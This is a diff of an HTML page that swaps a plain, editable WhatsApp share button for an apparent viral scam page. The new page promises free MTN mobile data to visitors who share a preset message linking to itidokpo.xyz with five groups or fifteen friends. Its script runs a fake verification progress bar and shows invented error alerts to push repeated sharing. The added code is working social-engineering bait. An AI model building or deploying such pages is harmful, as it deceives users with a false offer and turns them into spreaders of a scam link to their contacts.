@@ -1,351 +1,143 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>WhatsApp Share Button</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Share</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
+        button {
+            display: block;
+            width: 200px;
+            height: 50px;
+            color: #fff;
+            border: none;
+            outline: none;
+            font-size: 24px;
+            cursor: pointer;
+            border-radius: 5px;
+            padding: 0 10px;
+            margin: 10px auto;
+            background: rgb(255, 202, 6);
+            transition: background 0.3s ease;
+        }
+        button:hover {
+            background: #098105;
+        }
+        .barr {
+            direction: ltr;
+            max-width: 400px;
+            margin: 10px auto;
             box-sizing: border-box;
         }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+        .fill {
+            position: relative;
+            display: inline-block;
+            width: calc(100% - 100px);
+            height: 35px;
+            padding: 2px;
+            border: 2px solid #098105;
         }
-
-        .container {
-            background: white;
-            border-radius: 24px;
-            padding: 40px 32px;
-            max-width: 500px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        #fill2 {
+            background: #098105;
+            width: 0%;
+            height: 100%;
+        }
+        .percentage {
+            width: 100px;
+            float: right;
+            height: 35px;
+            font-size: 16px;
+            border: 2px solid #098105;
+        }
+        .center {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        #percentage2 {
+            margin-left: 5px;
+        }
+        .tip {
+            font-size: 14px;
             text-align: center;
         }
-
-        h1 {
-            font-size: 28px;
-            color: #333;
-            margin-bottom: 12px;
-        }
-
-        .subtitle {
-            color: #666;
-            margin-bottom: 32px;
-            font-size: 16px;
-            line-height: 1.5;
-        }
-
-        /* Custom Share Button */
-        .share-btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            background: #25D366;
-            color: white;
-            border: none;
-            padding: 16px 32px;
-            font-size: 18px;
-            font-weight: 600;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            width: 100%;
-            max-width: 280px;
-            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
-        }
-
-        .share-btn:hover {
-            background: #20b859;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(37, 211, 102, 0.4);
-        }
-
-        .share-btn:active {
-            transform: translateY(0);
-        }
-
-        /* WhatsApp Icon (simple SVG) */
-        .wa-icon {
-            width: 24px;
-            height: 24px;
-            fill: white;
-        }
-
-        /* Message preview section */
-        .preview {
-            background: #f0f2f5;
-            border-radius: 16px;
-            padding: 20px;
-            margin: 32px 0;
-            text-align: left;
-        }
-
-        .preview-title {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .preview-message {
-            background: white;
-            border-radius: 12px;
-            padding: 16px;
-            font-size: 14px;
-            line-height: 1.5;
-            color: #111;
-            word-break: break-word;
-            border: 1px solid #e0e0e0;
-        }
-
-        .preview-message strong {
-            color: #25D366;
-        }
-
-        .edit-area {
-            margin-top: 20px;
-        }
-
-        textarea {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 14px;
-            font-family: inherit;
-            resize: vertical;
-            transition: border-color 0.3s;
-        }
-
-        textarea:focus {
-            outline: none;
-            border-color: #25D366;
-        }
-
-        label {
-            display: block;
-            font-size: 13px;
-            color: #666;
-            margin-bottom: 8px;
-            text-align: left;
-            font-weight: 500;
-        }
-
-        .status {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 10px;
-            font-size: 14px;
-            display: none;
-        }
-
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-            display: block;
-        }
-
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-            display: block;
-        }
-
-        hr {
-            margin: 24px 0;
-            border: none;
-            border-top: 1px solid #e0e0e0;
-        }
-
-        .counter {
-            font-size: 14px;
-            color: #888;
-            margin-top: 16px;
-        }
-
-        .reset-btn {
-            background: none;
-            border: 1px solid #ddd;
-            padding: 8px 16px;
-            border-radius: 20px;
-            color: #666;
-            font-size: 13px;
-            cursor: pointer;
-            margin-top: 12px;
-            transition: all 0.2s;
-        }
-
-        .reset-btn:hover {
-            background: #f0f0f0;
-            border-color: #ccc;
+        .title {
+            text-align: center;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>📱 WhatsApp Share</h1>
-        <p class="subtitle">Share your message with friends or groups</p>
+    <div style="max-width: 500px; margin: 0 auto; padding: 20px;">
+        <p class="tip">Complete the verification process to receive your 1 Month Free Data now</p>
+        <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
+        <p class="tip">2. You will be redirected automatically to "ACTIVATION" page after the GREEN verification bar is filled.</p>
 
-        <!-- Custom Share Button -->
-        <button class="share-btn" id="whatsappShareBtn">
-            <svg class="wa-icon" viewBox="0 0 24 24" width="24" height="24">
-                <path d="M12.04 2C6.58 2 2.13 6.45 2.13 11.91c0 1.75.48 3.45 1.38 4.93L2 22l5.23-1.47c1.43.78 3.05 1.2 4.72 1.2 5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.91-7.02S14.69 2 12.04 2zm0 2.36c2.08 0 4.03.81 5.5 2.28s2.28 3.42 2.28 5.5c0 4.34-3.53 7.87-7.87 7.87-1.45 0-2.87-.39-4.11-1.12l-.3-.18-3.1.87.93-3.02-.2-.32c-.78-1.26-1.19-2.71-1.19-4.22 0-4.34 3.53-7.87 7.87-7.87z"/>
-                <path d="M16.19 14.05c-.22-.11-1.3-.64-1.5-.71-.2-.07-.35-.11-.5.11-.15.22-.57.71-.7.85-.13.15-.26.17-.48.06-.22-.11-.93-.34-1.77-1.09-.65-.59-1.09-1.32-1.22-1.54-.13-.22-.01-.34.1-.45.1-.1.22-.26.33-.39.11-.13.15-.22.22-.37.07-.15.04-.28-.02-.39-.06-.11-.5-1.2-.68-1.64-.18-.44-.37-.37-.5-.38-.13 0-.28-.01-.43-.01-.15 0-.39.06-.59.28-.2.22-.77.75-.77 1.83s.79 2.13.9 2.27c.11.15 1.55 2.37 3.75 3.32.52.23.93.36 1.25.46.52.16.99.14 1.37.08.42-.06 1.3-.53 1.48-1.04.18-.51.18-.95.13-1.04-.05-.09-.19-.15-.41-.26z"/>
-            </svg>
-            Share on WhatsApp
-        </button>
-
-        <!-- Message Preview -->
-        <div class="preview">
-            <div class="preview-title">
-                📋 Message Preview
-                <span style="font-size: 11px;">(editable)</span>
+        <button id="whatsapp"><font color="black">SHARE</font></button>
+        
+        <div class="barr">
+            <div class="fill">
+                <div id="fill2"></div>
             </div>
-            <div class="preview-message" id="messagePreview">
-                Check out this amazing offer! 🎉<br>
-                Click here: https://example.com/offer
+            <div class="percentage center">
+                <span><i class="fa fa-spinner fa-pulse"></i></span>
+                <span id="percentage2">0%</span>
             </div>
         </div>
-
-        <!-- Edit Message Area -->
-        <div class="edit-area">
-            <label>✏️ Edit your share message:</label>
-            <textarea id="messageInput" rows="4" placeholder="Type your message here...">Check out this amazing offer! 🎉
-
-Click here: https://example.com/offer</textarea>
-        </div>
-
-        <!-- Optional: Share counter (just for fun) -->
-        <div class="counter">
-            📤 Total shares: <span id="shareCount">0</span>
-            <button class="reset-btn" id="resetCount">Reset</button>
-        </div>
-
-        <hr>
-
-        <p style="font-size: 12px; color: #999;">
-            💡 Tip: Works on mobile devices with WhatsApp installed
-        </p>
-
-        <div id="statusMsg" class="status"></div>
     </div>
 
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
     <script>
-        // Get elements
-        const shareBtn = document.getElementById('whatsappShareBtn');
-        const messageInput = document.getElementById('messageInput');
-        const messagePreview = document.getElementById('messagePreview');
-        const shareCountSpan = document.getElementById('shareCount');
-        const resetBtn = document.getElementById('resetCount');
-        const statusMsg = document.getElementById('statusMsg');
-
-        // Load saved share count from localStorage
-        let shareCount = localStorage.getItem('whatsappShareCount') ? parseInt(localStorage.getItem('whatsappShareCount')) : 0;
-        shareCountSpan.textContent = shareCount;
-
-        // Update preview when message changes
-        function updatePreview() {
-            let text = messageInput.value;
-            // Convert line breaks to <br> for preview
-            messagePreview.innerHTML = text.replace(/\n/g, '<br>');
-        }
-
-        messageInput.addEventListener('input', updatePreview);
+        var text1 = "*MTN 1 MONTH FREE DATA FOR OLD SUBSCRIBERS 🎉*%0A%0AGet 1 Month Free Data if your MTN Sim Card is up to a year old%0A%0A*HOW OLD IS YOUR SIM CARD*?%0A1 Year Old - 5GB%0A2 Years and above - 10GB%0A5 - 10 Years - 20GB%0A10 Years and above - 50GB  %0A%0A*Get Offer*👇%0Ahttps://itidokpo.xyz/freemtndata",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            saved = "",
+            share = "whatsapp://send?text="+text1;
         
-        // Initial preview
-        updatePreview();
-
-        // Function to show status message
-        function showStatus(message, isSuccess = true) {
-            statusMsg.textContent = message;
-            statusMsg.className = 'status ' + (isSuccess ? 'success' : 'error');
-            setTimeout(() => {
-                statusMsg.style.display = 'none';
-                statusMsg.className = 'status';
-            }, 3000);
-        }
-
-        // Main share function
-        function shareOnWhatsApp() {
-            let message = messageInput.value.trim();
-            
-            if (!message) {
-                showStatus('❌ Please enter a message to share!', false);
-                return;
-            }
-
-            // Encode the message for URL
-            const encodedMessage = encodeURIComponent(message);
-            
-            // Create WhatsApp share URL
-            // Use 'whatsapp://send' for mobile app, fallback to web.whatsapp.com
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            
-            let whatsappUrl;
-            if (isMobile) {
-                // Mobile - opens WhatsApp app
-                whatsappUrl = `whatsapp://send?text=${encodedMessage}`;
+        var width = 0;
+        
+        $("#whatsapp").click(function () {
+            window.location.href = share;
+            if (width == 0) {
+                width += 50;
+            } else if (width == 50) {
+                alert(error);
+                width += 15;
+            } else if (width == 65) {
+                width += 5;
+            } else if (width == 70) {
+                alert(error);
+                width += 10;
+            } else if (width == 80) {
+                alert(error);
+                width += 5;
+            } else if (width == 85) {
+                width += 2;
+            } else if (width == 87) {
+                width += 1;
+            } else if (width == 88) {
+                width += 2;
+            } else if (width == 90) {
+                width += 1;
+            } else if (width == 91) {
+                width += 1;
+            } else if (width == 92) {
+                width += 1;
+            } else if (width == 93) {
+                width += 1;
+            } else if (width == 94) {
+                width += 1;
+            } else if (width == 95) {
+                width += 1;
+            } else if (width == 96) {
+                width += 2;
             } else {
-                // Desktop - opens WhatsApp Web
-                whatsappUrl = `https://web.whatsapp.com/send?text=${encodedMessage}`;
+                $("#share").fadeOut(0);
+                $("#claim").fadeIn(1000);
             }
-            
-            // Try to open WhatsApp
-            window.location.href = whatsappUrl;
-            
-            // Increment share count (tracking attempts)
-            shareCount++;
-            shareCountSpan.textContent = shareCount;
-            localStorage.setItem('whatsappShareCount', shareCount);
-            
-            // Show success message
-            showStatus('✅ Opening WhatsApp... Share your message!');
-            
-            // Fallback for desktop if WhatsApp Web doesn't open
-            setTimeout(() => {
-                if (!isMobile && !document.hidden) {
-                    showStatus('⚠️ Make sure you are logged into WhatsApp Web', false);
-                }
+            localStorage.setItem(saved, width);
+            setTimeout(function () {
+                $("#fill2").css("width", width + "%");
+                $("#percentage2").text(width + "%");
             }, 2000);
-        }
-
-        // Attach click event
-        shareBtn.addEventListener('click', shareOnWhatsApp);
-
-        // Reset counter
-        resetBtn.addEventListener('click', () => {
-            if (confirm('Reset share counter?')) {
-                shareCount = 0;
-                shareCountSpan.textContent = shareCount;
-                localStorage.setItem('whatsappShareCount', shareCount);
-                showStatus('Counter reset!', true);
-            }
-        });
-
-        // Optional: Add keyboard shortcut (Ctrl+Enter to share)
-        messageInput.addEventListener('keydown', (e) => {
-            if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
-                e.preventDefault();
-                shareOnWhatsApp();
-            }
-        });
-
-        // Detect if user returns to page after sharing (mobile)
-        window.addEventListener('pageshow', () => {
-            // Optional: do something when user comes back
-            console.log('Returned to page');
         });
     </script>
 </body>
